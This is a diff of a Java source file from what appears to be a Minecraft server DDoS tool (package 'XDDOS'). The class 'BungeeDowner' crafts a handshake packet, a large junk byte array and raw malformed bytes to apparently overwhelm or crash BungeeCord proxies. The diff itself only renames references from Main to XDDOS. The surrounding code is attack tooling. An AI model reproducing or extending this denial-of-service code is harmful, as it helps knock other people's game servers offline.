@@ -6,7 +6,7 @@ import java.io.IOException;
 import java.security.SecureRandom;
 import java.util.zip.Deflater;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.LoginRequest;
@@ -21,7 +21,7 @@ import io.netty.channel.Channel;
 public class BungeeDowner 
 implements Method{
 
-    private byte[] handshake = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2)).getWrappedPacket();
+    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
     public byte[] ad = new byte[]{127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128, 127, -128};
     private static String sa = "";
     private volatile int i = 0;
@@ -95,7 +95,7 @@ implements Method{
         out.write(0);
         out.write(-47);
         out.write(-9);
-        out.writeBytes(Main.srvRecord);
+        out.writeBytes(XDDOS.srvRecord);
         out.write(-99);
         out.write(-224);
         out.write(-1);
